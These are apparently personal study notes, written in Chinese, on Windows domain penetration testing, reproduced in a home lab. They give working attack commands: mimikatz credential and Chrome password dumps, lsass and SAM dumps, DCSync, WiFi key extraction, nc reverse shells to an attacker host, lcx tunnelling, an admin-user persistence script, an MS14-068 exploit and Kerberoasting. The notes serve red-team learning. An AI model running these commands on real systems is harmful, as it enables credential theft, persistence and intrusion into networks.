# 内网渗透学习笔记

作者：chriskali Github：chriskaliX

> 近期，拜读了[腾讯蓝军-红蓝对抗之Windows内网渗透](https://mp.weixin.qq.com/s/OGiDm3IHBP3_g0AOIHGCKA)，学到了不少知识点。打算拆分章节进行整理以及复现，主要记录自己缺失的知识点。这是一个大杂烩文章，主线是跟着jumbo师傅的思路，碰到感兴趣的，我会继续扩展。可能有点凌乱，希望大家见谅。

## 0x01 环境搭建

这一步略过，简单介绍一下测试的环境

|主机名|IP地址|角色|系统|
|:-:|:-:|:-:|:-:|
|DC|10.10.10.10|DC\|DNS|Winserver 2012|
|John|10.10.10.11|normal|win7|
|Bob|10.10.10.12|normal|win10|
|web|10.10.10.15|web|winserver 2008|

域为 `xxcom.local` ，网段为 `10.10.10.1/24`，（web是后来添加的）
环境下载[地址](https://msdn.itellyou.cn/)

## 0x02 信息收集

> 问过有经验的师傅们，渗透测试中（包括内网），最为关键的部分其实就是信息收集。信息收集的广度和信息理解程度，往往决定了后续内网渗透开展的进度。

### SPN扫描

> SPN即(Service Principal Names)服务器主体名称，可以理解为一个服务(如HTTP，MSSQL)等的唯一标识符，**在加入域时是自动注册的**，如果用一句话来说明的话就是如果想使用 Kerberos 协议来认证服务，那么必须正确配置SPN

#### 分类

一种注册在AD的机器账户下，另一种注册在域用户账户下

- 当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下
- 当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下

#### 特点

在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以快速发现内网中的资产以及服务

#### 使用

自带的 `setspn` 工具即可，`setspn -T domain.com -Q */*`
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/setspn.png)
因为这里DC上安装了DNS服务，所以能看到注册的dns服务
当然也可以使用其他工具，扔一个[链接](https://www.freebuf.com/articles/system/174229.html)

### 端口信息

直接 `netstat` 获取
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/netstat.png)

### 配置文件

~~暂略，没有一一搭建，只能默默记录一下...~~

### 用户信息

> 这部分不太复杂，就不放图了，当个备忘录记一下

|指令|功能|
|:-:|:-:|
|net user /domain|查看域内用户|
|net group "domain admins" /domain|查看域管|
|net time /domain|时间服务器\|DNS 一般都是DC|
|nslookup -type=all \_ldap.\_tcp.dc._msdcs.xxcom.local|查询dns|
|net group "domain controllers" /domain|查看域控|
|query user \|\| qwinsta|查看在线用户|

每个查找的都能有许多方法（例如DNS的），就不重复记录了

### 内网主机发现

> 这边多是主机命令操作，整理一下直接搬了

`net view`报错6118问题，需要手动开启 `SMB 1.0/CIFS` 文件共享支持。
顺带提及一下 CIFS ，CIFS即 Common Internet File System，像SMB协议一样，CIFS在高层运行（不像TCP/IP运行在底层），可以将其看作HTTP或者FTP那样的协议。具体看[文章](https://www.cnblogs.com/jinanxiaolaohu/p/10550061.html)

|指令|功能|
|:-:|:-:|
|net view|查看共享资料|
|arp -a|查看arp表|
|ipconfig /displaydns|查看dns缓存|
|nmap nbtscan...(顺手就行~)|工具扫描|
|type c:\Windows\system32\drivers\etc\hosts|查看hosts文件|

### 会话收集

> 通过会话帮助理清攻击目标。其中用到了PowerView，属于PowerSploit和Empire框架的一部分，这里不太多介绍工具，主要是用于复现和思路整理

以 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit.git) 为例子。在本次环境中，win10默认为 Restricted ，Windows Server 2012 默认为 RemoteSigned

#### Powershell执行策略

从`<<内网安全攻防>>`摘抄

|策略名称|详情|
|:-:|:-:|
|Restricted|脚本不能运行|
|AllSigned|仅当脚本由收信人的发布者签名才能运行|
|REMOTESIGNED|从Internet下载的脚本和配置文件需要具有受信任，本地的可以|
|Unrestrict|允许所有脚本运行|

于是在本机操作命令如下所示：
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/powershell_1.png)

绕过执行策略的方法

1. `powershell.exe -ExecutionPolicy Bypass -File .\test.ps1`
2. `powershell.exe -exec bypass -Command "& {Import-Module ps路径}"`

在本机上执行：

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/Powershell_2.png)

具体的操作如下

|指令|功能|
|:-:|:-:|
|1. `Import-Module .\PowerView.ps1` 2. `Invoke-UserHunter -Username "bob"`|查看域用户登录过的机器|
|Get-NetSession -ComputerName xxx|查看哪些用户登录过|

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/session.png)

### 凭据搜集

#### 凭据介绍

> [三好学生文章](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/)讲的详细，我看完之后搬运一点过来，使用到的工具有自带的 cmdkey | vaultcmd | mimikatz

- Domain Credentials：只有本地 Local Security Authority(LSA)能够对其读写，普通权限无法读取
- Generic Credentials：能够被用户进程读写，普通用户也可以

两者具体的区别可以查看[官方文档](https://msdn.microsoft.com/en-us/library/aa380517.aspx)。其余的东西就不照搬了，需要的时候查阅一下即可~

### DPAPI

> 先给出[微软官方文档](https://docs.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)?redirectedfrom=MSDN)，其实每个知识点都可以深入看的。但目前我的小目标是先大致理解，在整个流程上明白后再慢慢深入，查漏补缺

DPAPI(Data Protection API)即文件保护API，提供了加密函数 CryptProtectData 与解密函数 CryptUnprotectData。我的理解就是一套对外提供加解密的接口，为用户和系统进程提供操作系统级别（底层）的数据保护服务
这个还是挺有意思的，之前没接触过，实操一边记录一下：

1. mimikatz抓chrome密码（这里直接在本机上抓）
   `mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect`

   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/chrome.png)

2. mimikatz解密Credential（需要管理员权限）
   `mimikatz vault::cred /patch`
   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/vault.png)

### 域信任

> 这里应该要去搭建多域环境，先挖一个坑，后面再回来看看

`nltest /domain_trusts`

### 域传送

> 补充原理：DNS服务器分为主、备以及缓存服务器。主备之间同步数据，需要通过DNS域传送。具体指备服务器需要从主服务器拷贝数据来更新自身数据库。其原因为配置不当，如果存在则很快将内部的网络拓扑泄露

windows下的利用方法：

1. nslookup -type=ns domain.com （查出ns服务器）
2. nslookup
3. server xxx.domain.com（查出的ns服务器）
4. ls domain.com

linux下利用方法：

​`dig  @dns.domain.com axfr domain.com`

### DNS记录获取

这里用PowerView实现

1. Import-Module PowerView.ps1
2. Get-DNSRecord  -ZoneName xxcom.local

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/dns.png)

### WIFI

> 这个我觉得挺好的哈哈哈，个人PC机器很有用

`for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles')  do @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear`
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/WIFI.png)

### 组策略|GPP

> 这个经常会出现，光看两个文件或者操作一下命令觉得不印象深刻，还是稍微看一下来的比较实在

#### 分类区别

1. 本地组策略 - LGP（Local Group Policy或者Local GPO）

   手动设定组策略

   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/LGP.png)
   或者将文件放入 `C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup` ，在启动后会自动执行

   cs上线图：

   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/LGP_CS.png)
   这里启动方式可以为 powershell 或者 exe 程序等。这个出现很早了，也是一种权限维持的方式，不过比较明显，会被严格查杀吧~

2. 域组策略

   > 为什么会需要域组策略？例如域内默认的密码过于简单，一个一个修改太过麻烦，可以使用域组策略批量修改密码

   如何解决呢，抄一下xq17师傅文章中的内容：

   - 通过在域中下发脚本执行
   - 在GPP（组策略首选项）中设置
   - LAPS（这个在 基础篇 - PTH 防御提及过）

   跟着xq17师傅的文章，先看一看sysvol，netlogon这两个文件夹。

   **netlogon**
      挂载点为 `SYSVOL\domain\SCRIPTS` ，存放脚本信息
   **sysvol**
      是AD域中的一个共享文件夹，存放组策略数据和脚本配置，供域成员访问。在域中，用户登录时会先在sysvol下查找**GPO**

   ------

   **GPO又是什么呢**
      GPO（Group Policy Object）是组策略设置的集合，用GPO来存储不同的组策略信息，可以指定作用范围（安装完了后默认存在两个）一：Default Domain Policy 即默认组策略。二：Default Domain Controllers Policy即默认域控制器策略。

   ------

   **GPP**
      终于看到了之前看到多次的GPP。组策略首选项（Group Policy Preference，GPP）借助了GPO实现域中所有资源的管理。截个图，在组策略管理中可以找到
   ![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/GPP.png)
   GPP是2008中新增的，在这之前统一管理只能写脚本，GPP的出现方便了管理。
   同样搬运xq17师傅的文章，这里就不复现了

   ```cmd
   shell for /r \\dc/sysvol %i in (*.vbs) do @echo %i
   shell for /r \\dc/sysvol %i in (*.bat) do @echo %i
   ```

   **有关GPP的漏洞**，只存在于winserver 2008没有上补丁（KB2962486）的时候（如windows server 2012就不存在），在sysvol下会有一个xml文件，其中的 password 字段是以aes-256保存的，但是微软把密钥放出来了...所以可以解密的。所以我认为搜索的脚本就是这样的，快速找到xml文件即可：
   ```shell for /r \\dc/sysvol %i in (*.xml) do @echo %i```
   可以直接使用 PowerSploit下的 Get-GPPPassword.ps1 进行解密操作

#### 参考

[Freebuf](https://www.freebuf.com/vuls/92016.html)
[xq17师傅先知文章](https://xz.aliyun.com/t/7784)

### 工具

> 这两个后面再去花时间看看，跟着工具也能学到不少新知识吧~

**seatbelt**
**bloodhound**

### Exchange

> 这里暂时没有搭建，默默记下

## 0x03 内网通信

> 刚好看到这里的时候，正好也看到了[酒仙桥作战部队](https://mp.weixin.qq.com/s/6Q_i34ND-Epcu-71LHZRlA)的文章，一块整理一下

### 正反向代理

略

### 转发工具

> 转发的工具其实也有很多，感觉也不是一定都要全部用上。顺手的，免杀的，就是坠吼的
> 图搬运自酒仙桥作战部队文章

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/transfer.png)

提及一下 socks 。socks目前分为2个版本，socks4和socks5。
socks4 支持 TELNET, FTP, HTTP等TCP协议
socks5支持TCP与UDP，并且支持安全认证方案
他们都不支持ICMP，也就是都不能拿来ping
**所以在使用socks4版本时候，nmap要加上`-sT`和`-Pn`** 来禁止使用 icmp协议

#### Netsh

> netsh是windows自带的，可以用来做端口转发的工具

`netsh interface portproxy add v4tov4 listenport=80 connectport=80 connectaddress=10.10.10.8  protocol=tcp`
在10.10.10.12（windows 10上开启）
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/netsh1.png)
然后在10.10.10.10上访问10.10.10.12的80端口，看到
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/netsh2.png)

#### Nc

| 类型 | A主机（攻击机）      | B主机（反弹机）               |                          |
| ---- | -------------------- | ----------------------------- | ------------------------ |
| 正向 | nc -nvv B主机IP 5555 | nc -l -p 5555 -t -e cmd.exe   | A主机正向连接B主机       |
| 反向 | nc -lvvp 5555        | nc -t -e cmd.exe A主机ip 5555 | A主机监听，B主机反向连接 |

#### frp

> 经典，老FRP了，FRP的功能十分丰富齐全，就不重复做搬运工了，可以直接看[文档](https://github.com/fatedier/frp/blob/v0.33.0/README_zh.md)

#### Venom

> 这个是在看酒仙桥作战部队的时候学习到的，[Venom地址](https://github.com/Dliv3/Venom)

这个项目看起来挺好的，Go写的，落地也没有被杀，估计用的人不是很多吧（我猜

这个工具主要是两个，admin跟agent，一个是主控一个代理，两个都支持监听和主动连接

##### 具体使用

在自己的VPS上开启监听，监听9999端口

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/venom_1.png)

本地主机主动连接

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/venom_2.png)

这时候查看我们的admin端

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/venom_3.png)

可以看到还有其他的功能，`setdes` 设定标识，`getdes` 获取标识 ，`goto` 选择一个节点进行操作，`listen` 开启一个监听（但是咋关掉我还没发现...）， `connect` 这个在多级代理的情况下挺好的，一条路打通了。还有节点之间都可以设置密码，这个比较重要
socks这个也好用，挂代理后windows下proxifier，linux下proxychains挂上就行，但是默认监听公网的...还没找到如何监听本地

#### **reGeorg**

通过http/https进行代理访问内网，具体的为上传一个服务器解析的tunnel，通过运行 `python reGeorgSocksProxy.py -p 1080 -u http://xx.xx.xx.xx/tunnel.jsp`

#### SSH

> SSH可以做转发，之前也整理过，不过没有发到博客里面。主要分为本地转发，远程转发，动态转发

本地转发：
`ssh -CfNg -L 本机端口1:本机地址:本机端口2 账号@IP地址`
将本机端口2转发到本机端口1
远程转发：
`ssh -CfNg -R 本地端口:目标地址:目标端口 账号@IP地址`
将内网服务器的地址转发到外网端口
动态转发：
`ssh -qTfnN -D 本地端口 账号@ip地址`
将任意端口转发至本地端口，常见的就是挂代理后用代理工具访问。例如我将cobaltstrike开启后限制外网IP访问，只能通过ssh动态转发打通隧道后访问，防止被爬取指纹，暴露自己。

#### **EarthWorm**

资料多，不粘贴复制了

#### goproxy

> Goproxy也是一款功能齐全的工具，支持多种协议穿透，它的功能可能超过日常转发所需，但是不报毒嘛...

#### lcx

| 方式 |                             命令                             |
| :--: | :----------------------------------------------------------: |
| 反向(外部vps) | `外部VPS：lcx.exe -listen 1111 2222`|
| 反向(受害者)|`受害者：lcx.exe -slave VPSip 1111 127.0.0.1 3389`|
|反向(使用方法)|访问本地2222端口即访问受害者3389端口|
| 正向 | `lcx.exe -tran 1111 2.2.2.2 8080`|
|正向(使用方法)|访问本地1111端口就是2.2.2.2的8080端口|

#### Mssql

> clr相关[项目地址](https://github.com/blackarrowsec/mssqlproxy)

想起看 Mssql 命令执行的方法时，里面就有CLR，首先为了表示尊敬，贴上[参考文章1](https://xz.aliyun.com/t/7534#toc-10)，[参考文章2](https://xz.aliyun.com/t/6682)

##### 什么是clr

CLR(common language runtime)即公共语言运行库，从SQL Server 2005(9.x) 开始，集成了CLR组件，意味着可以使用任何 .NET Framework语言来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数

流程往往为 制作恶意CLR => 导入程序集 => 利用执行，这里偷个懒，先mark一下。恰巧20200716的时候已经有一个小哥做了[分析](https://xz.aliyun.com/t/7993)，后面我去看看！

### 代理工具

windows下我用proxifier

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/proxifier.png)

linux下为proxychains

## 0x04 权限提升

> 看到比较好的[文章](https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842)
> 首先在Windows中，权限大概分为四类，分别为 User，Administrator，System，TrustedInstaller（依次增高），通常接触到的为前面三种。

|       权限       |                             详细                             |
| :--------------: | :----------------------------------------------------------: |
|       User       |                         普通用户权限                         |
|  Administrator   | 管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码） |
|      System      | 系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump |
| TrustedInstaller |                  最高权限，可以操作系统文件                  |

### UAC

> 为什么是Administrator了，仍然不能进行某些操作（如抓密码），这与UAC有关。UAC（User Account Control）即用户账户控制，以达到阻止恶意程序的效果

右键程序，以管理员身份进行登录，就会触发UAC
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/UAC_1.png)

默认情况下，UAC的级别为  仅在程序试图更改我的计算机时通知我

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/UAC.png)

**这里需要注意**，UAC操作必须在管理员组才行，否则会要求先输入管理员密码再执行
以下是蓝军文章中搬运来的

1. metasploit下运行bypassuac（这个需要文件落地，特征明显），或者bypassuac_injection直接运行在内存的反射DLL中，可以一定程度规避杀软
2. metasploit下的runas模块，使用`exploit/windows/local/ask`模块运行一个可执行文件，会发起提权的请求。同样的，能发起请求一定要在管理员组或者知道管理员密码，在使用Runas的时候需要使用`EXE::Custom` 创建可执行文件，需要免杀
3. metapsloit下其他bypass_uac的模块（我甚至有点好奇能不能rdp上去点一下...）

找到另外一个bypassuac的

#### CVE-2019-1388

> 这个没怎么明白啊，埋个坑mark一下

[jas502n-CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388.git)

### MS14-068

> 看 klion 师傅说的，目前能碰到这个的情况已经很少了。这个漏洞可以在只有一个普通域用户的权限，提升到域控权限。其对应的补丁号为 kb3011780

#### 造成原因

具体的Kerberos认证在之前整理文章里已经提及过了。第一阶段返回的TGT，包含了 用户名、用户id、所属组等信息，称之为PAC。这个PAC就是验证用户当前所有权限的一个特权证书。问题在于：在申请TGT的时候，可以要求KDC返回的TGT不包含PAC，然后用户可以自己构造PAC。这相当于用户控制了自己的特权证书，可以伪造成任意的用户（域用户）。

#### 利用方法

1. 用 `msf`中的 `ms14-068` payload（略）
2. 搬运腾讯蓝军文章
   `python  ms14-068.py -u <userName>@<domainName> -s <userSid> -d  <domainControlerAddr>`
   `mimikatz.exe  "kerberos::ptc TGT_user@domain.ccache" exit`
3. `ms14068 + psexec`  ==> `goldenPac.py domain.com/username:password@dc.domain.com`

------

提权模块蓝军的文章到这里就结束了，但是觉得太少，翻一翻先知的文章，自己补充了一些。[文章来源](https://xz.aliyun.com/t/7573)

------

### 溢出提权

根据补丁信息提权。这个视情况而定，通常使用到的有辅助提权网站
[辅助提权连接](https://bugs.hacking8.com/tiquan/)

### 启动项提权

- 启动项路径 `C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

- 创建脚本

  ```shell
  vbs：
    set wshshell=createobject("wscript.shell")
    a=wshshell.run("cmd.exe /c net user 用户名 密码  /add",0)
    b=wshshell.run("cmd.exe /c net localgroup administrators 用户名 /add",0)
  bat：
    net user 用户名 密码 /add
    net localgroup administrators 用户名 /add
  ```

- 接下来需要等待机器重启并以较大权限的账号登录，暴力一点可以配合漏洞打蓝屏poc强制重启
- bat会弹dos，vbs不会

~~这个是从文章中直接复制的，但是总感觉这个方式比较被动，可行性不高的样子，不过也算是一种方法~~

### Potato系列提权

> 土豆，没有看内网之前就有听过一些，烂土豆等等。感觉这个摊开也是一个很大的土豆饼啊！先给出参考的文章，我暂时先不挖这么深了...不然支线太多，主线看不完。更：20200714看到安全师上的一篇[文章](https://www.secshi.com/40957.html)挺好，这里做个汇总
> 20200804：发现自己对这一块的理解可能稍微有点混乱，添加新的整理和理解

还是根据这篇[先知文章](https://xz.aliyun.com/t/7776#toc-1)，好好摸索一遍！
在获取到主机权限后，执行 `whoami /priv` 查看当前用户的权限，当拥有 `SeImpersonatePrivilege` 和 `SeAssignPrimaryTokenPrivilege` ，而通常情况下，只有高权限用户，如System用户才有后者的权限，所以根据文章中，列出拥有前者权限的 Windows 账号用户

- 本地管理员账户（不包括管理员组普通用户）和**本地服务账户**
- 由SCM启动的服务

所以这就是为啥提权好用的原因吧，因为初步获取的权限一般都是IIS这种服务权限

**SCM是啥**
碰到自己的盲区了，稍微歪个楼自省一下(总觉得好像看过了，可能是我忘记了)。SCM是Service Control Manager的缩写，即服务控制管理器，微软官方的[文档](https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager)，其实也不细，留个印象

本地启动一个管理员powershell，执行whoami /priv 截图如下

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/Impersonate.png)

#### Rotten Potato（烂土豆提权）

> 这个是听到最多的啦，烂土豆提权，其对应的编号为 MS16-075，针对的是本地用户提权。需要为服务用户，例如 IIS 这种

##### 原理

> 这一部分我搬运了[烂土豆文章](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)，边看边学习，因为实在太多了，一直搬运就和抄没啥区别了（我还是先自己看看，消化一下

1. 触发 "NT AUTHORITY\SYSTEM" 账号与我们的TCP端进行NTLM认证
2. 以NTLM relay的方式本地协商（这个外文翻译的...）的方式获取 "NT AUTHORITY\SYSTEM" 的token，这是通过调用一系列Windows API完成的
3. 模拟令牌，仅当攻击者的当前账户具有模拟令牌的特权时才可以这样做，通常适用于大多数服务账户，不适用于大多数用户级别账户

在原始的 [Hot Potato](https://foxglovesecurity.com/2016/01/16/hot-potato/)中（这个后面继续看...），使用**NBNS欺骗**，**WPAD**和Windows Update服务进行了一些复杂的操作，诱使通过HTTP向我们进行身份验证，从而获取高权限账号。
而烂土豆用到的是把 **DCOM** / **RPC** （DCOM埋个坑...也没看过），诱骗到NTLM中来进行身份验证。这种方法在于它是100%可靠的，在Windows版本之间保持一致，并且可以立即触发，不必等待Windows Update
上面说的很绕，我觉得三好学生师傅说的挺好的，搬运一下帮助大家理解：
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/3gstudent.png)

##### 利用

1. 在msf中为  `exploit/windows/local/ms16_075_reflection_juicy`
   这时候看到了熟悉的 juicy，天天的 `juicy potato` 在这里出现了，翻开三好学生大佬的文章，发现普通的 `Rotten Potato` 固定了COM对象为BITS，而`juicy potato`提供了多个，具体的可以看[这里](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)。他们的原理是一样的，`juicy potato` 可以算作是 `Rotten Potato` 的加强版。
2. 用现成的exe，github上有，略过

#### Hot Potato

> 关于这类基础的知识点，按理来说应该全部重新整理。但是我选择穿插在这里，因为之前看过了一部分，这个文章也是以学习为主，查漏补缺。基础知识点可以看freebuf的[玄武](https://www.freebuf.com/column/202842.html)写的文章

##### 土豆原理

**NBNS欺骗：**
NBNS是UDP广播协议，基于NetBIOS提供主机名和地址的映射方法。默认情况下，进行一次域名查询的时候的顺序为 hosts->dns->NBNS
通过UDP端口枯竭使UDP端口失效，迫使DNS失效从而回退到NBNS，从而可以主动地触发NBNS

**伪造WPAD代理服务器：**
WPAD在先知上有一篇[文章](https://xz.aliyun.com/t/1739)，我搬运其中的一小部分。WPAD即Web代理自动发现协议，该协议的功能是可以使局域网中用户的浏览器可以自动发现内网中的代理服务器。当开启了后，用户会先去找PAC（Proxy Auto Config，这个东西以前配vpn的时候有看到过），然后解析
而Windows中的一些服务，例如这里用到的Windows Update就采用了这个机制

通过NBNS泛洪欺骗，解析到本机启动的WPAD，进行HTTP-> SMB NTLM relay。
缺点比较明显，时间周期很长的...又要考虑到WPAD的更新，还要通过Windows Update来主动调用

#### Sweet Potato

> 土豆太多了，这个的原理我有点没太看懂....先给自己埋个坑，以后我再去看

扔两个地址出来吧
[cs-sweetpotato提权](https://lengjibo.github.io/SweetPotato/)

#### 参考文章

[先知-土豆系列](https://xz.aliyun.com/t/7776)
[烂土豆相关](http://hackergu.com/powerup-stealtoken-rottenpotato/)
[烂土豆文章](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
[烂土豆文章2](https://www.anquanke.com/post/id/92908)
[安全师](https://www.secshi.com/40957.html)

### Mysql提权

#### UDF提权

UDF(User-Defined Function)用户自定义函数，是Mysql的一个扩展接口，用户可以通过UDF实现Mysql中难以实现的功能。在sqlmap直连mysql使用os-shell指令时，默认也是以UDF的方式获取权限

#### Mof提权

> 这个好像更早了，大致原理，我理解为**nullevt.mof**每间隔一段时间就会被执行的特性，通过修改这个mof达到获取权限的目的，具体的就不再做搬运仔了

[这篇文章](https://www.freebuf.com/articles/web/243136.html)总结了mysql的利用，关于mysql的文章也很多，我就不做朴实的搬运工了。~~PS.我觉得这个是直接拿别的权限呀...~~

## 0x05 密码获取

> 这里腾讯蓝军的文章占用了很大的篇幅，因为包含了许多基础知识（如lmhash，ntlmhash生成等等），因为在之前整理过的入门篇章已经有了，所以会有一些不一样。还是记录自己不会的，边看边学

### 本地凭据获取

> 这里其实已经在之前的整理过了，重新整理(搬运)一下，看过或者熟悉的可以直接跳过了，这里纯搬指令
>
> 20200714：今天看到了Ateam的文章...没想到和卡巴对抗的情况呀...不过目前太菜还看不懂，先mark一下[文章](https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97)

#### reg转储

```shell
reg save hklm\sam sam.hive
reg save hklm\system system.hive
reg save hklm\security security.hive
```

#### Mimikatz

```shell
privilege::debug
token::elevate
lsadump::sam

从lsass.exe进程获取

privilege::debug
sekurlsa::logonpasswords
```

#### Procdump + Mimikatz

```shell
procdump64.exe  -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe  "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords  full" exit
```

没有明文的原因还是 kb2871997（**之前我还以为这个只和PTH有关，学到啦**）。kb2871997补丁会删除除了wdigest ssp以外其他ssp的明文凭据，但对于wdigest ssp只能选择禁用。用户可以选择将`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential`更改为0来禁用。
[\*] 注意：这一段直接粘贴复制的 ~~偶尔搬运一下，方便理解~~

### 域Hash

> 这部分没有手动实现过，所以这里慢慢看，复现一下。导出的方法也很多，这里先上Wing仔的[文章](https://xz.aliyun.com/t/2527)，我就不一一复现了...用两个好用的！

在拿到域控权限后，有时候需要导出域内所有主机的Hash，对应的文件为 `C:\Windows\NTDS\NTDS.dit` 导出所有用户的hash，但是这个是一直被占用的，如果直接去复制会抛出如下错误：
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ntds.png)

这时候需要用到**卷影备份**的方法

#### ntdsutil + ntdsdump

直接用本地自带的工具 `ntdsutil`，操作如下
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ntdsutil.png)

然后再使用 `ntdsdump.exe` (也有看到直接用的，我只有这样成功...)
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ntdsdump.png)

#### Mimikatz工具

> 万能的猕猴桃

为啥用Mimikatz能直接dump呢，搬运一下wing仔翻译的文章：

> Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。

`mimikatz.exe privilege::debug "lsadump::dcsync /domain:xxcom.local /all /csv" exit`

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/mimikatz_ntds.png)

### Access Token

> 基础篇过了一次，实操的时候摸过了，用 msf 下的 incognito。getsystem也是去搜寻可用的令牌进行提权

### Kerberosting

> 这个之前看到，但是没有认真看一下

#### 相关原理

因为看过Kerberos协议，结合蓝军文章可以简单理解。在Kerberos第二阶段（即与TGS通信）完成时会返回一张ST，ST使用Server端的（当时我说是NLTM Hash）密码进行加密。当 Kerberos 协议设置票据为 **RC4** 方式时，我们就可以通过爆破在Client端获取的票据ST，获取对应的Server端的密码。（学到了，很开心）

#### 实操

首先安装一个 `mssql` ，注册 spn 服务，`setspn -A MSSQLSvc/web.xxcom.local xxcom\web`，注意需要为本地管理员权限，否则会提示权限不足
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_reg.png)

先查询 SPN，上面已经介绍过，查询看到刚刚注册的 MSSQL
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_query.png)

运行Add-type时报错，其实为缺少依赖，为了节省时间直接换到DC上去操作

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_error.png)

```powershell
$SPNName="MSSQLSvc/web.xxcom.local"
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
```

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/spn_klist.png)

在 `mimikatz` 中运行 `kerberos::list /export`

![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/klist_mimikatz.png)

之后跑的工具为 `tgsrepcrack.py` ，在[这里](https://github.com/nidem/kerberoast)下载就行

`python tgsrepcrack.py wordlist xxxxxx` 即可

### 密码喷射

蓝军文章是kerbrute，可以爆破用户，也可以密码喷射...工具下载ing，先看下面

## 0x06 横向移动

### 账号密码连接

#### IPC

> 从[这个博客](https://www.cnblogs.com/-mo-/p/11813608.html)搬运来一些东西，为了方便理解，仅供参考

IPC是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。利用`IPC$`,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。利用条件：

1. 139,445端口开启
2. 管理员开启默认共享

`net use \\1.1.1.1\ipc$ "password" /user:username`
![image](https://github.com/chriskaliX/AD-Pentest-Notes/raw/master/imgs/ipc.png)

#### PSEXEC

> 20200729:今日有师傅了个问题，445横向的方法有哪些。发掘自己对与工具的理解还停留在表面，并未深入理解工具本身，特做补充和继续发掘

psexec是什么：详情看[百度百科](https://baike.baidu.com/item/psexec/9879597?fr=aladdin)，看完后我概括（搬运）一下。是一个轻型的telnet代替工具，可以在远程系统上执行程序，不过特征明显会报毒，同时会产生大量日志。msf下也有对应的模块，搜索关键字即可
命令为：`psexec \\target -accepteula -u username -p password cmd.exe`

##### 执行原理和过程

PSEXEC执行分为以下几个步骤

1. 通过IPC$链接，然后释放psexesvc.exe到目标主机
